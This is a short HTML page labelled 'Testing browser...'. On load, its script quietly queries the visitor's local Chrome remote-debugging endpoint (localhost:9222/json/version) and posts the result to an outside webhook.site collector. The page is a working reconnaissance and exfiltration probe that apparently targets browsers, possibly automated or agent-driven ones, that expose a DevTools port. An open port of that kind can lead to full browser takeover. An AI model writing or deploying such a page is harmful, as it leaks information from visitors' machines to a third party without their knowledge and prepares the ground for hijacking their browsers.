<!doctype html>
<meta charset="utf-8">
<pre id="out">Testing browser...</pre>
<script>
(async () => {
  const hook = "https://webhook.site/a66ae4f5-fdf1-46dd-acff-05d5c108df64";

  async function report(x) {
    document.getElementById("out").textContent = x;
    try {
      await fetch(hook, {method:"POST", mode:"no-cors", body:x});
    } catch(e) {}
  }

  try {
    const r = await fetch("http://localhost:9222/json/version");
    const t = await r.text();
    await report("DEBUG_ENDPOINT: " + t);
  } catch(e) {
    await report("DEBUG_ENDPOINT_ERROR: " + String(e));
  }
})();
</script>
